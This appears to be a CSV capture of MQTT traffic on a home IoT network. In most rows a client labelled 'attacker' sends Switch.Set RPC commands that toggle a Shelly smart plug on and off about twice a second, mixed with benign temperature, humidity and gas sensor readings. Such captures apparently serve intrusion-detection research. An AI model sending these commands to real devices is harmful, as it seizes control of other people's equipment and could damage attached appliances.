2026-04-22T16:17:45,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3546 33198.372 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:46,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:46,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:46,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3547 33198.855 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:46,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:46,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33198.85,""swi"
2026-04-22T16:17:46,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3548 33198.872 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:17:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:17:46,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:17:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:17:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:17:46,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:46,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:46,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3549 33199.365 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:46,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:46,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33199.36,""swi"
2026-04-22T16:17:46,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3550 33199.383 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:47,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:47,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:47,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3551 33199.856 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:47,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:47,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33199.85,""swi"
2026-04-22T16:17:47,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3552 33199.872 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:47,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:47,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:47,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3553 33200.356 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:47,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:47,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33200.35,""swi"
2026-04-22T16:17:47,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3554 33200.375 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:48,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:48,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:48,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3555 33200.857 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:48,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:48,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33200.85,""swi"
2026-04-22T16:17:48,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3556 33200.874 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:48,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:48,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:48,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3557 33201.357 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:48,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:48,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33201.35,""swi"
2026-04-22T16:17:48,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3558 33201.376 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:49,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:49,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:49,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3559 33201.858 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:49,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:49,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33201.85,""swi"
2026-04-22T16:17:49,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3560 33201.874 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:49,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:49,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:17:49,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:49,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3561 33202.358 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:49,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:17:49,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:49,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33202.36,""swi"
2026-04-22T16:17:49,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3562 33202.377 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:50,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:50,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:50,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3563 33202.858 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:50,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:50,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33202.86,""swi"
2026-04-22T16:17:50,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3564 33202.875 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:50,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:50,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:50,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3565 33203.360 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:50,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:50,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33203.36,""swi"
2026-04-22T16:17:50,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3566 33203.378 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:51,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:51,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:51,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3567 33203.861 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:51,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:51,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33203.86,""swi"
2026-04-22T16:17:51,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3568 33203.877 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:51,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:51,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:51,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3569 33204.360 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:51,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:51,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33204.36,""swi"
2026-04-22T16:17:51,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3570 33204.379 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:52,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:52,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:52,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3571 33204.860 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:52,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:52,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33204.86,""swi"
2026-04-22T16:17:52,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3572 33204.877 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:52,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:52,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:52,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3573 33205.361 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:52,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:52,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33205.36,""swi"
2026-04-22T16:17:52,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3574 33205.380 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:53,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:53,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:53,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3575 33205.862 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:53,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:53,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33205.86,""swi"
2026-04-22T16:17:53,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3576 33205.878 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:53,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:53,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:53,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3577 33206.362 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:53,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:53,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33206.36,""swi"
2026-04-22T16:17:53,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3578 33206.381 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:54,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:54,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:54,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3579 33206.863 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:54,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:54,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33206.86,""swi"
2026-04-22T16:17:54,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3580 33206.879 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:54,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:54,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:17:54,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:17:54,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:54,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3581 33207.363 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:54,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:54,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33207.36,""swi"
2026-04-22T16:17:54,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3582 33207.382 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:55,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:55,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:55,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3583 33207.867 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:55,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:55,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33207.86,""swi"
2026-04-22T16:17:55,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3584 33207.883 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:55,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:55,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:55,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3585 33208.366 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:55,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:55,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33208.36,""swi"
2026-04-22T16:17:55,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3586 33208.385 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:56,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:56,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:56,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3587 33208.865 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:56,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:56,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33208.86,""swi"
2026-04-22T16:17:56,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3588 33208.881 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:17:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:17:56,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:17:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:17:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:17:56,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:56,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:56,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3589 33209.365 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:56,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:56,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33209.36,""swi"
2026-04-22T16:17:56,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3590 33209.384 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:57,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:57,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:57,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3591 33209.865 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:57,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:57,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33209.86,""swi"
2026-04-22T16:17:57,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3592 33209.882 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:57,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:57,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:57,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3593 33210.366 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:57,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:57,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33210.36,""swi"
2026-04-22T16:17:57,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3594 33210.385 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:58,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:58,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:58,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3595 33210.866 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:58,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:58,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33210.86,""swi"
2026-04-22T16:17:58,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3596 33210.882 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:58,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:58,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:58,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3597 33211.367 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:58,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
